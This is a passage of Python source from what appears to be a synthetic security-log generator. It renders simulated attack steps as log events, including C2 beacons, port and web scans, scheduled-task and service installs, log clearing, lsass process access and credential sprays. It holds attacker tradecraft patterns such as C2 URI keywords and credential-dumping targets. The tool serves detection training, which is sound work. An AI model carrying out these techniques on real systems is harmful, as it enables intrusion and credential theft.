            effective_dst_ip = dst_ip
            if (
                not _is_private_ip(source_ip)
                and hasattr(self, "dispatcher")
                and self.dispatcher.visibility_engine
            ):
                effective_dst_ip = self.dispatcher.visibility_engine._real_ip_to_vip.get(
                    dst_ip, dst_ip
                )
            dst_port = spec.dst_port
            service = spec.service or (
                "ssl" if dst_port == 443 else "http" if dst_port == 80 else "ssl"
            )
            # Build HttpContext if HTTP fields are provided
            http_ctx = None
            if spec.method or spec.uri:
                from evidenceforge.events.contexts import HttpContext

                # Context-aware response sizing (or author-specified override)
                _method = spec.method or "GET"
                _uri_raw = spec.uri or "/"
                _uri = _uri_raw.lower()
                _mime_type = normalize_mime_type_for_path(_uri_raw, "text/html")
                if spec.response_body_len is not None:
                    resp_bytes = spec.response_body_len
                elif _method == "POST" and any(
                    kw in _uri for kw in ("/upload", "/submit", "/api", "/beacon")
                ):
                    resp_bytes = rng.randint(200, 2000)
                elif _method == "GET" and any(
                    kw in _uri for kw in ("/callback", "/task", "/cmd", "/beacon", "/gate")
                ):
                    resp_bytes = rng.randint(500, 5000)
                elif _method == "POST":
                    resp_bytes = rng.randint(200, 5000)
                else:
                    resp_bytes = response_size_for_mime(rng, _mime_type)
                from evidenceforge.generation.activity.referrer import pick_referrer

                _http_host = spec.hostname or dst_ip
                http_ctx = HttpContext(
                    method=_method,
                    host=_http_host,
                    uri=_uri_raw,
                    version="1.1",
                    user_agent=spec.user_agent or "Mozilla/5.0",
                    request_body_len=rng.randint(100, 10000) if _method == "POST" else 0,
                    response_body_len=resp_bytes,
                    status_code=spec.status_code or 200,
                    status_msg={
                        200: "OK",
                        301: "Moved Permanently",
                        302: "Found",
                        403: "Forbidden",
                        404: "Not Found",
                        500: "Internal Server Error",
                    }.get(spec.status_code or 200, "OK"),
                    referrer=spec.referrer
                    if spec.referrer is not None
                    else pick_referrer(rng, _http_host, context="general"),
                    resp_mime_types=[_mime_type] if (spec.status_code or 200) == 200 else [],
                    tags=[],
                )

            # Resolve source system from source_ip (not storyline system, which may be the target)
            src_sys = None
            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
            if source_ip in ip_map:
                src_sys = ip_map[source_ip]
            elif source_ip == system.ip:
                src_sys = system
            story_pid, story_image = self._last_storyline_process_for_system(src_sys)
            # Only use explicit hostname from scenario.  Do NOT fall back to
            # Hostname resolution for storyline connections:
            # - Explicit hostname → use it, emit DNS
            # - No hostname but IP in REVERSE_DNS → use known hostname, emit DNS
            # - No hostname, unknown IP → suppress (raw-IP C2/exfil), no DNS
            from evidenceforge.generation.activity.network import REVERSE_DNS

            if spec.hostname:
                conn_hostname = spec.hostname
                emit_dns = True
            elif dst_ip in REVERSE_DNS:
                conn_hostname = None  # let generate_connection resolve via REVERSE_DNS
                emit_dns = True
            else:
                conn_hostname = ""  # suppress — raw IP
                emit_dns = False
            s_ob, s_rb = _size_storyline_connection(spec, rng)
            s_conn_state = spec.conn_state or "SF"
            uid = self.activity_generator.generate_connection(
                src_ip=source_ip,
                dst_ip=effective_dst_ip,
                time=time,
                dst_port=dst_port,
                service=service,
                duration=rng.uniform(1.0, 30.0),
                orig_bytes=s_ob,
                resp_bytes=s_rb,
                conn_state=s_conn_state,
                emit_dns=emit_dns,
                source_system=src_sys,
                http=http_ctx,
                pid=story_pid,
                process_image=story_image,
                hostname=conn_hostname,
            )
            malicious_event["dst_ip"] = dst_ip
            malicious_event["dst_port"] = dst_port
            malicious_event["uid"] = _ground_truth_uid(uid, source_ip, effective_dst_ip)

            # Causal expansion: SMB to file server emits type 3 logon pair
            if dst_port == 445:
                dst_sys = next(
                    (s for s in self.scenario.environment.systems if s.ip == dst_ip),
                    None,
                )
                if (
                    dst_sys
                    and dst_sys.roles
                    and "file_server" in [r.lower() for r in dst_sys.roles]
                ):
                    if hasattr(self, "_emit_smb_logon_pair"):
                        self._emit_smb_logon_pair(actor, dst_sys, source_ip, time, rng)

        elif spec.type == "ssh_session":
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            if hasattr(self, "world_planner"):
                source_system = (
                    self.world_model.system_for_ip(spec.source_ip)
                    if spec.source_ip and hasattr(self, "world_model")
                    else None
                )
                result = self.world_planner.bootstrap_user_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    rng=rng,
                    session_kind="ssh",
                    source_system=source_system,
                    allow_existing=False,
                    source_ip_override=spec.source_ip,
                    storyline_protected=True,
                )
            else:
                source_ip = spec.source_ip or system.ip
                uid = self.activity_generator.generate_ssh_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    source_ip=source_ip,
                )
                result = SimpleNamespace(network_uid=uid)
            if getattr(result, "session", None) is not None:
                self._record_storyline_logon(actor, target, result.session.logon_id)
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 22
            result_source_ip = (
                result.session.source_ip
                if getattr(result, "session", None) is not None
                else spec.source_ip or system.ip
            )
            malicious_event["uid"] = _ground_truth_uid(
                result.network_uid or "",
                result_source_ip,
                target.ip,
            )

        elif spec.type == "rdp_session":
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            if hasattr(self, "world_planner"):
                source_system = (
                    self.world_model.system_for_ip(spec.source_ip)
                    if spec.source_ip and hasattr(self, "world_model")
                    else None
                )
                result = self.world_planner.bootstrap_user_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    rng=rng,
                    session_kind="rdp",
                    source_system=source_system,
                    allow_existing=False,
                    source_ip_override=spec.source_ip,
                    storyline_protected=True,
                )
            else:
                source_ip = spec.source_ip or system.ip
                uid = self.activity_generator.generate_rdp_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    source_ip=source_ip,
                )
                result = SimpleNamespace(network_uid=uid)
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 3389
            result_source_ip = (
                result.session.source_ip
                if getattr(result, "session", None) is not None
                else spec.source_ip or system.ip
            )
            malicious_event["uid"] = _ground_truth_uid(
                result.network_uid or "",
                result_source_ip,
                target.ip,
            )

        elif spec.type == "account_created":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = spec.target_sid or self._make_domain_sid()
            self.activity_generator.generate_account_created(
                actor=actor,
                system=dc,
                time=time,
                target_username=spec.target_username,
                target_sid=target_sid,
            )
            # Store SID for later reuse by group_member_added, account_deleted,
            # and any _get_sid() lookups (Windows event rendering).
            self._created_account_sids[spec.target_username] = target_sid
            self.activity_generator.sid_registry[spec.target_username] = target_sid
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "account_deleted":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = (
                spec.target_sid
                or self._created_account_sids.get(spec.target_username)
                or self._make_domain_sid()
            )
            self.activity_generator.generate_account_deleted(
                actor=actor,
                system=dc,
                time=time,
                target_username=spec.target_username,
                target_sid=target_sid,
                from_storyline=True,
            )
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "group_member_added":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            group_rid = 512 if "admin" in spec.group_name.lower() else rng.randint(1100, 9999)
            group_sid = self._make_domain_sid(group_rid)
            # Reuse SID from earlier account_created event, or generate new
            member_sid = (
                self._created_account_sids.get(spec.member_name)
                or self.activity_generator.sid_registry.get(spec.member_name)
                or self._make_domain_sid()
            )
            self.activity_generator.generate_group_membership_change(
                actor=actor,
                system=dc,
                time=time,
                action="add",
                scope=spec.scope,
                group_name=spec.group_name,
                group_sid=group_sid,
                member_username=spec.member_name,
                member_sid=member_sid,
            )
            malicious_event["group_name"] = spec.group_name
            malicious_event["member_name"] = spec.member_name

        elif spec.type == "service_installed":
            self.activity_generator.generate_service_installed(
                user=actor,
                system=system,
                time=time,
                service_name=spec.service_name,
                service_file_name=spec.service_file_name,
                service_account=spec.service_account,
            )
            malicious_event["service_name"] = spec.service_name
            if spec.service_file_name:
                malicious_event["service_file_name"] = spec.service_file_name

        elif spec.type == "scheduled_task_created":
            task_content = spec.task_content
            if not task_content:
                task_content = (
                    f'<?xml version="1.0" encoding="UTF-16"?>\n'
                    f'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
                    f'  <Actions Context="Author">\n'
                    f"    <Exec>\n"
                    f"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\n"
                    f'      <Arguments>/c "{spec.task_name}"</Arguments>\n'
                    f"    </Exec>\n"
                    f"  </Actions>\n"
                    f"</Task>"
                )
            elif not task_content.lstrip().startswith(("<?xml", "<Task")):
                task_content = (
                    f'<?xml version="1.0" encoding="UTF-16"?>\n'
                    f'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
                    f'  <Actions Context="Author">\n'
                    f"    <Exec>\n"
                    f"      <Command>{task_content}</Command>\n"
                    f"    </Exec>\n"
                    f"  </Actions>\n"
                    f"</Task>"
                )
            self.activity_generator.generate_scheduled_task(
                user=actor,
                system=system,
                time=time,
                task_name=spec.task_name,
                action="created",
                task_content=task_content,
            )
            malicious_event["task_name"] = spec.task_name
            malicious_event["task_content"] = task_content

        elif spec.type == "log_cleared":
            subject_logon_id = self._recent_storyline_process_logon_id(
                system,
                time,
                executable="wevtutil.exe",
            )
            self.activity_generator.generate_log_cleared(
                user=actor,
                system=system,
                time=time,
                from_storyline=True,
                subject_logon_id=subject_logon_id,
            )

        elif spec.type == "create_remote_thread":
            source_pid, source_image = self._last_storyline_process_for_system(system)
            if source_pid <= 0:
                source_pid = 0
                source_image = "unknown"
            # Use a realistic target PID — look up the process name from
            # system PIDs or use a plausible default (not 4 = System kernel)
            target_name = spec.target_process.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            target_pid = self.activity_generator._get_system_pid(
                system.hostname,
                target_name.replace(".exe", ""),
                0x27C,  # 636 default
            )
            self.activity_generator.generate_create_remote_thread(
                user=actor,
                system=system,
                time=time,
                source_pid=source_pid,
                source_image=source_image,
                target_pid=target_pid,
                target_image=spec.target_process,
            )
            # Emit ProcessAccess via causal expansion engine (or legacy fallback)
            # when targeting lsass.exe — primary credential-dumping detection signal
            if "lsass" in target_name:
                self.activity_generator._expand_and_emit(
                    "create_remote_thread",
                    time,
                    actor=actor,
                    target_system=system,
                    source_pid=source_pid,
                    source_image=source_image,
                    target_pid=target_pid,
                    target_image=spec.target_process,
                )
            malicious_event["target_process"] = spec.target_process

        elif spec.type == "process_access":
            source_pid, source_image = self._last_storyline_process_for_system(system)
            if source_pid <= 0:
                # Without a source process, there is no realistic Sysmon Event
                # 10 relationship to render. Keep the storyline record, but do
                # not fabricate an unowned process-access event.
                malicious_event["target_process"] = spec.target_process
                malicious_event["skipped_reason"] = "no_source_process"
            else:
                os_category = _get_os_category(system.os)
                target_image = _normalize_storyline_process_image(
                    spec.target_process,
                    os_category,
                    username=actor.username,
                )
                target_name = target_image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
                target_pid = self.activity_generator._get_system_pid(
                    system.hostname,
                    target_name.replace(".exe", ""),
                    0x27C,
                )
                self.activity_generator.generate_process_access(
                    user=actor,
                    system=system,
                    time=time,
                    source_pid=source_pid,
                    source_image=source_image,
                    target_pid=target_pid,
                    target_image=target_image,
                    granted_access=spec.access_mask,
                )
                malicious_event["target_process"] = target_image

        elif spec.type == "dhcp_lease":
            ip_hash = _stable_seed(f"mac_{spec.requested_ip or system.ip}")
            mac = spec.mac_address or (
                f"00:50:56:{(ip_hash >> 16) & 0xFF:02x}"
                f":{(ip_hash >> 8) & 0xFF:02x}:{ip_hash & 0xFF:02x}"
            )
            from evidenceforge.utils.ids import generate_zeek_uid

            # Use DC as DHCP server (common in AD environments)
            dc_ips = self._infra_ips.get("dc", ["10.0.0.1"]) if hasattr(self, "_infra_ips") else []
            dhcp_server = dc_ips[0] if dc_ips else "10.0.0.1"
            self.activity_generator.generate_dhcp_lease(
                system=system,
                time=time,
                mac=mac,
                server_addr=dhcp_server,
                lease_time=float(rng.choice([3600, 7200, 14400, 86400])),
                uid=generate_zeek_uid("C"),
            )
            malicious_event["mac_address"] = mac

        elif spec.type == "port_scan":
            import ipaddress

            # Resolve target IPs
            if spec.target_ips:
                resolved_targets = list(spec.target_ips)
            elif spec.target_segment and self.scenario.environment.network:
                seg = next(
                    (
                        s
                        for s in self.scenario.environment.network.segments
                        if s.name == spec.target_segment
                    ),
                    None,
                )
                if seg:
                    net = ipaddress.ip_network(seg.cidr, strict=False)
                    all_hosts = [str(h) for h in net.hosts()]
                    count = min(spec.target_count, len(all_hosts))
                    resolved_targets = rng.sample(all_hosts, count)
                else:
                    resolved_targets = []
            else:
                resolved_targets = []

            # Determine conn_state from firewall drop_mode
            conn_state = self._get_firewall_deny_conn_state()

            # Use source_ip override if specified, otherwise use system IP
            scan_src_ip = spec.source_ip or system.ip

            # Resolve interfaces
            src_iface = self._resolve_firewall_interface(scan_src_ip)

            # Generate deny connections: targets × ports
            spacing = 1.0 / spec.scan_rate
            total_count = 0
            for target_ip in resolved_targets:
                dst_iface = self._resolve_firewall_interface(target_ip)
                for port in spec.ports:
                    jitter_offset = rng.uniform(-spacing * 0.2, spacing * 0.2)
                    scan_time = time + timedelta(seconds=total_count * spacing + jitter_offset)
                    self.state_manager.set_current_time(scan_time)

                    from evidenceforge.events.contexts import FirewallContext

                    # ICMP is connectionless — don't pass TCP conn_state
                    scan_conn_state = None if spec.protocol == "icmp" else conn_state
                    self.activity_generator.generate_connection(
                        src_ip=scan_src_ip,
                        dst_ip=target_ip,
                        time=scan_time,
                        dst_port=port,
                        proto=spec.protocol,
                        conn_state=scan_conn_state,
                        firewall=FirewallContext(
                            action="deny",
                            msg_id=106023,
                            connection_id=0,
                            src_interface=src_iface,
                            dst_interface=dst_iface,
                            access_group=f"{src_iface}_access_in",
                        ),
                        emit_dns=False,
                    )
                    total_count += 1

            malicious_event["target_count"] = len(resolved_targets)
            malicious_event["ports"] = spec.ports
            malicious_event["total_connections"] = total_count
            malicious_event["protocol"] = spec.protocol

        elif spec.type == "beacon":
            # Resolve timing parameters
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            beacon_src_ip = spec.source_ip or system.ip

            # Deny mode: firewall context
            fw_ctx = None
            deny_conn_state = None
            if spec.action == "deny":
                from evidenceforge.events.contexts import FirewallContext

                deny_conn_state = self._get_firewall_deny_conn_state()
                src_iface = self._resolve_firewall_interface(beacon_src_ip)
                dst_iface = self._resolve_firewall_interface(spec.dst_ip)
                fw_ctx = FirewallContext(
                    action="deny",
                    msg_id=106023,
                    connection_id=0,
                    src_interface=src_iface,
                    dst_interface=dst_iface,
                    access_group=f"{src_iface}_access_in",
                )

            # Allow mode: resolve service, http context, hostname, byte sizing
            service = spec.service
            http_ctx = None
            conn_hostname = None
            emit_dns = False
            s_ob, s_rb = _size_storyline_connection(spec, rng)
            s_conn_state = spec.conn_state or "SF"

            if spec.action == "allow":
                service = service or (
                    "ssl" if spec.dst_port == 443 else "http" if spec.dst_port == 80 else "ssl"
                )
                # Build HttpContext if HTTP/proxy-visible request metadata is provided.
                # HTTPS CONNECT beacons still need this for proxy User-Agent fidelity
                # even though no origin-side Zeek http.log is emitted for TLS.
                if spec.method or spec.uri or spec.user_agent:
                    from evidenceforge.events.contexts import HttpContext

                    _method = spec.method or "GET"
                    _uri_raw = spec.uri or "/"
                    _mime_type = normalize_mime_type_for_path(_uri_raw, "text/html")
                    if spec.response_body_len is not None:
                        resp_bytes = spec.response_body_len
                    elif _method == "POST":
                        resp_bytes = rng.randint(200, 2000)
                    else:
                        resp_bytes = response_size_for_mime(rng, _mime_type)
                    from evidenceforge.generation.activity.referrer import pick_referrer

                    _http_host2 = spec.hostname or spec.dst_ip
                    http_ctx = HttpContext(
                        method=_method,
                        host=_http_host2,
                        uri=_uri_raw,
                        version="1.1",
                        user_agent=spec.user_agent or "Mozilla/5.0",
                        request_body_len=rng.randint(100, 10000) if _method == "POST" else 0,
                        response_body_len=resp_bytes,
                        status_code=spec.status_code or 200,
                        status_msg={
                            200: "OK",
                            301: "Moved Permanently",
                            302: "Found",
                            403: "Forbidden",
                            404: "Not Found",
                            500: "Internal Server Error",
                        }.get(spec.status_code or 200, "OK"),
                        referrer=spec.referrer
                        if spec.referrer is not None
                        else pick_referrer(rng, _http_host2, context="general"),
                        resp_mime_types=[_mime_type] if (spec.status_code or 200) == 200 else [],
                        tags=[],
                    )

                # Hostname / DNS resolution (same logic as connection handler)
                from evidenceforge.generation.activity.network import REVERSE_DNS

                if spec.hostname:
                    conn_hostname = spec.hostname
                    emit_dns = True
                elif spec.dst_ip in REVERSE_DNS:
                    conn_hostname = None
                    emit_dns = True
                else:
                    conn_hostname = ""
                    emit_dns = False

            # Resolve source system
            src_sys = None
            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
            if beacon_src_ip in ip_map:
                src_sys = ip_map[beacon_src_ip]
            elif beacon_src_ip == system.ip:
                src_sys = system
            story_pid, story_image = self._last_storyline_process_for_system(src_sys)

            attempt_count = 0
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                self.state_manager.set_current_time(tick_time)
                if spec.action == "deny":
                    proxy_chain = getattr(self.activity_generator, "_proxy_routes", {}).get(
                        beacon_src_ip
                    )
                    explicit_proxy = (
                        getattr(self.activity_generator, "_proxy_mode", "transparent") == "explicit"
                        and proxy_chain
                        and spec.protocol == "tcp"
                        and spec.dst_port in (80, 443)
                    )
                    if explicit_proxy:
                        from evidenceforge.events.contexts import ProxyContext

                        proxy_sys = proxy_chain[0]
                        beacon_host = spec.hostname or spec.dst_ip
                        proxy_method = "CONNECT" if spec.dst_port == 443 else (spec.method or "GET")
                        proxy_url = (
                            f"{beacon_host}:443"
                            if proxy_method == "CONNECT"
                            else f"http://{beacon_host}{spec.uri or '/'}"
                        )
                        proxy_ctx = ProxyContext(
                            client_ip=beacon_src_ip,
                            method=proxy_method,
                            url=proxy_url,
                            host=beacon_host,
                            status_code=403,
                            sc_bytes=rng.randint(500, 2000),
                            cs_bytes=rng.randint(180, 520),
                            time_taken=rng.randint(20, 1500),
                            user_agent=spec.user_agent or "Mozilla/5.0",
                            content_type="text/html",
                            cache_result="DENIED",
                            referrer=spec.referrer or "",
                            proxy_fqdn=self.activity_generator._proxy_fqdn(proxy_sys),
                        )
                        self.activity_generator.generate_connection(
                            src_ip=beacon_src_ip,
                            dst_ip=spec.dst_ip,
                            time=tick_time,
                            dst_port=spec.dst_port,
                            proto=spec.protocol,
                            service="ssl" if spec.dst_port == 443 else "http",
                            duration=rng.uniform(0.05, 2.0),
                            orig_bytes=s_ob,
                            resp_bytes=s_rb,
                            conn_state="SF",
                            emit_dns=emit_dns and attempt_count == 0,
                            source_system=src_sys,
                            http=http_ctx,
                            proxy=proxy_ctx,
                            hostname=conn_hostname if conn_hostname is not None else spec.hostname,
                            pid=story_pid,
                            process_image=story_image,
                        )
                    else:
                        self.activity_generator.generate_connection(
                            src_ip=beacon_src_ip,
                            dst_ip=spec.dst_ip,
                            time=tick_time,
                            dst_port=spec.dst_port,
                            proto=spec.protocol,
                            conn_state=deny_conn_state,
                            firewall=fw_ctx,
                            emit_dns=False,
                        )
                else:
                    # Allow DNS only on the first tick; cache handles the rest
                    self.activity_generator.generate_connection(
                        src_ip=beacon_src_ip,
                        dst_ip=spec.dst_ip,
                        time=tick_time,
                        dst_port=spec.dst_port,
                        proto=spec.protocol,
                        service=service,
                        duration=rng.uniform(0.5, 10.0),
                        orig_bytes=s_ob,
                        resp_bytes=s_rb,
                        conn_state=s_conn_state,
                        emit_dns=emit_dns and attempt_count == 0,
                        source_system=src_sys,
                        http=http_ctx,
                        hostname=conn_hostname,
                        pid=story_pid,
                        process_image=story_image,
                    )
                attempt_count += 1

            malicious_event["dst_ip"] = spec.dst_ip
            malicious_event["dst_port"] = spec.dst_port
            malicious_event["interval"] = spec.interval
            malicious_event["action"] = spec.action
            term = spec.duration or spec.end_time or f"count={spec.count}"
            malicious_event["termination"] = term
            malicious_event["attempt_count"] = attempt_count

        elif spec.type == "dns_query":
            # QTYPE name → numeric mapping
            _QTYPE_MAP = {
                "A": 1,
                "AAAA": 28,
                "TXT": 16,
                "CNAME": 5,
                "MX": 15,
                "NULL": 10,
                "SRV": 33,
                "PTR": 12,
            }
            _RCODE_MAP = {"NOERROR": 0, "NXDOMAIN": 3, "SERVFAIL": 2, "REFUSED": 5}

            from evidenceforge.events.contexts import DnsContext

            qtype_num = _QTYPE_MAP.get(spec.qtype, 1)
            rcode_num = _RCODE_MAP.get(spec.rcode, 0)

            # Build answers list
            answers = []
            ttls = []
            if spec.answer is not None:
                answers = [spec.answer] if isinstance(spec.answer, str) else list(spec.answer)
                ttl_val = float(spec.ttl) if spec.ttl is not None else float(rng.randint(60, 3600))
                ttls = [ttl_val] * len(answers)

            # Resolve DNS server IP before choosing source-native DNS RTT so
            # local resolvers do not get impossible multi-second timings.
            dns_server_ips = getattr(self.activity_generator, "_dns_server_ips", ["10.0.0.1"])
            dns_server_ip = rng.choice(dns_server_ips)
            query_src_ip = spec.source_ip or system.ip
            from evidenceforge.generation.activity.generator import _dns_rtt

            dns_ctx = DnsContext(
                query=spec.query,
                query_type=spec.qtype,
                qtype=qtype_num,
                rcode=spec.rcode,
                rcode_num=rcode_num,
                answers=answers,
                TTLs=ttls,
                trans_id=rng.randint(1, 65535),
                AA=False,
                RD=True,
                RA=True,
                rejected=spec.rcode == "REFUSED",
                rtt=_dns_rtt(rng, dns_server_ip),
            )

            self.activity_generator.generate_connection(
                src_ip=query_src_ip,
                dst_ip=dns_server_ip,
                time=time,
                dst_port=53,
                proto="udp",
                service="dns",
                dns=dns_ctx,
                emit_dns=False,
                orig_bytes=rng.randint(40, 100),
                resp_bytes=rng.randint(80, 400) if spec.rcode == "NOERROR" else rng.randint(40, 80),
                conn_state="SF",
                duration=rng.uniform(0.001, 0.05),
            )

            malicious_event["query"] = spec.query
            malicious_event["qtype"] = spec.qtype
            malicious_event["rcode"] = spec.rcode

        elif spec.type == "web_scan":
            from evidenceforge.config.web_scan_presets import get_preset
            from evidenceforge.events.contexts import HttpContext

            # Load preset and merge with overrides
            scan_paths = []
            scan_ua = spec.user_agent or "Mozilla/5.0"
            if spec.preset:
                preset_data = get_preset(spec.preset)
                if preset_data is None:
                    logger.warning("Unknown web_scan preset: %s", spec.preset)
                else:
                    scan_paths = list(preset_data.get("paths", []))
                    scan_ua = spec.user_agent or preset_data.get("user_agent", scan_ua)
            if spec.paths:
                scan_paths.extend(spec.paths)
            if not scan_paths:
                raise ValueError(
                    f"web_scan resolved to zero paths (preset={spec.preset!r}). "
                    "Check preset name or provide explicit paths."
                )

            # Timing: rate-based → convert to interval
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()
            scan_src_ip = spec.source_ip or system.ip
            scan_host = spec.hostname or spec.dst_ip
            service = "http" if spec.dst_port == 80 else "ssl"
            scan_dst_ip = spec.dst_ip
            if (
                not _is_private_ip(scan_src_ip)
                and hasattr(self, "dispatcher")
                and self.dispatcher.visibility_engine
            ):
                scan_dst_ip = self.dispatcher.visibility_engine._real_ip_to_vip.get(
                    spec.dst_ip, spec.dst_ip
                )

            # Resolve source system
            src_sys = None
            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
            if scan_src_ip in ip_map:
                src_sys = ip_map[scan_src_ip]
            elif scan_src_ip == system.ip:
                src_sys = system
            story_pid, _story_image = self._last_storyline_process_for_system(src_sys)

            from evidenceforge.events.contexts import IdsContext
            from evidenceforge.generation.activity.referrer import pick_scan_referrer
            from evidenceforge.utils.ua_template import render_ua

            is_tls = spec.dst_port == 443
            ids_ua_def = preset_data.get("ids_ua") if preset_data else None
            ids_rate_def = preset_data.get("ids_rate") if preset_data else None
            rate_threshold = ids_rate_def.get("threshold", 20) if ids_rate_def else 20
            effective_rate = spec.rate
            if count is None and preset_data:
                max_effective_rate = preset_data.get("max_effective_rate")
                if max_effective_rate is not None:
                    effective_rate = min(effective_rate, float(max_effective_rate))
            interval_sec = _effective_rate_interval(effective_rate, count, rng)
            ua_fired = False
            last_rate_alert_ts = None
            _send_referrer_config = preset_data.get("send_referrer") if preset_data else None

            request_count = 0
            path_idx = 0
            pause_until: datetime | None = None
            for tick_time in _iter_periodic_ticks(
                start, interval_sec, duration_sec, count, spec.jitter, rng
            ):
                if pause_until is not None and tick_time < pause_until:
                    continue
                if request_count > 0 and rng.random() < 0.025:
                    continue
                if request_count > 0 and rng.random() < 0.008:
                    pause_until = tick_time + timedelta(seconds=rng.uniform(3.0, 45.0))
                    continue

                self.state_manager.set_current_time(tick_time)
                path_entry = scan_paths[path_idx % len(scan_paths)]
                path_idx += 1

                _method = path_entry.get("method", "GET")
                _uri = path_entry.get("uri", "/")
                _status = path_entry.get("status", 404)

                _mime_type = normalize_mime_type_for_path(_uri, "text/html")
                _scan_referrer = (
                    pick_scan_referrer(rng, scan_host, _send_referrer_config, port=spec.dst_port)
                    if _web_scan_path_allows_referrer(path_entry)
                    else ""
                )

                _response_body_len = (
                    response_size_for_mime(rng, _mime_type)
                    if _status < 400
                    else response_size_for_status(_status, scan_host, _uri)
                )
                http_ctx = HttpContext(
                    method=_method,
                    host=scan_host,
                    uri=_uri,
                    version="1.1",
                    user_agent=render_ua(scan_ua, rng),
                    request_body_len=rng.randint(100, 500) if _method == "POST" else 0,
                    response_body_len=_response_body_len,
                    status_code=_status,
                    status_msg={
                        200: "OK",
                        301: "Moved Permanently",
                        302: "Found",
                        403: "Forbidden",
                        404: "Not Found",
                        405: "Method Not Allowed",
                        500: "Internal Server Error",
                    }.get(_status, "OK"),
                    referrer=_scan_referrer,
                    resp_mime_types=[_mime_type] if _status == 200 else [],
                    tags=[],
                )

                # 3-layer IDS alert selection
                ids_ctx = None

                # Layer 1: Scanner UA detection (non-TLS only, once per 60s)
                if not is_tls and ids_ua_def and not ua_fired:
                    ids_ctx = IdsContext(
                        sid=ids_ua_def["sid"],
                        rev=ids_ua_def.get("rev", 1),
                        message=ids_ua_def["message"],
                        classification=ids_ua_def.get("classification", "web-application-attack"),
                        priority=ids_ua_def.get("priority", 2),
                    )
                    ua_fired = True

                # Layer 2: Per-path content alerts (non-TLS only)
                elif not is_tls and isinstance(path_entry.get("ids"), dict):
                    path_ids = path_entry["ids"]
                    ids_ctx = IdsContext(
                        sid=path_ids["sid"],
                        rev=path_ids.get("rev", 1),
                        message=path_ids["message"],
                        classification=path_ids.get("classification", "web-application-attack"),
                        priority=path_ids.get("priority", 2),
                    )

                # Layer 3: Connection-rate threshold (both TLS and non-TLS)
                if ids_ctx is None and ids_rate_def and request_count >= rate_threshold:
                    fire_rate = False
                    if last_rate_alert_ts is None:
                        fire_rate = True
                    elif (tick_time - last_rate_alert_ts).total_seconds() >= 60:
                        fire_rate = True
                    if fire_rate:
                        ids_ctx = IdsContext(
                            sid=ids_rate_def["sid"],
                            rev=ids_rate_def.get("rev", 1),
                            message=ids_rate_def["message"],
                            classification=ids_rate_def.get("classification", "attempted-recon"),
                            priority=ids_rate_def.get("priority", 2),
                        )
                        last_rate_alert_ts = tick_time

                conn_state, duration, orig_bytes, resp_bytes = _web_scan_connection_profile(rng)
                http_for_conn = http_ctx if conn_state == "SF" else None

                self.activity_generator.generate_connection(
                    src_ip=scan_src_ip,
                    dst_ip=scan_dst_ip,
                    time=tick_time,
                    dst_port=spec.dst_port,
                    service=service,
                    duration=duration,
                    orig_bytes=orig_bytes,
                    resp_bytes=resp_bytes,
                    conn_state=conn_state,
                    emit_dns=request_count == 0,
                    source_system=src_sys,
                    http=http_for_conn,
                    hostname=scan_host if spec.hostname else None,
                    pid=story_pid,
                    ids=ids_ctx,
                )
                request_count += 1

            malicious_event["dst_ip"] = spec.dst_ip
            malicious_event["dst_port"] = spec.dst_port
            malicious_event["preset"] = spec.preset
            malicious_event["request_count"] = request_count

        elif spec.type == "credential_spray":
            # Timing
            start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
            interval_sec = parse_duration(spec.interval).total_seconds()
            duration_sec = None
            count = spec.count
            if spec.duration is not None:
                duration_sec = parse_duration(spec.duration).total_seconds()
            elif spec.end_time is not None:
                end_dt = self._parse_storyline_time(spec.end_time)
                duration_sec = (end_dt - start).total_seconds()

            spray_src_ip = spec.source_ip or system.ip
            accounts = spec.target_accounts
            success_spec = spec.success
            success_account = success_spec.get("account") if success_spec else None
            success_after = success_spec.get("after", 0) if success_spec else 0

            # Resolve target accounts — include service accounts as synthetic User
            # objects so credential_spray targets resolve for both failed and success logons
            from evidenceforge.models.scenario import User as _User

            scenario_users = {u.username: u for u in self.scenario.environment.users}
            ad_domain = self.scenario.environment.domain or "corp.local"
            for svc_name in self.scenario.environment.service_accounts:
                if svc_name not in scenario_users:
                    scenario_users[svc_name] = _User(
                        username=svc_name,
                        full_name=svc_name,
                        email=f"{svc_name}@{ad_domain}",
                    )

            # Only attach DC for Windows domain-account sprays — Linux SSH brute
            # force or local-account attacks should not produce DC-side 4625/4776
            dc_system = None
            is_windows_target = "windows" in system.os.lower()
            has_domain_account = any(acct in scenario_users for acct in accounts)
            if is_windows_target and has_domain_account:
                dcs = [
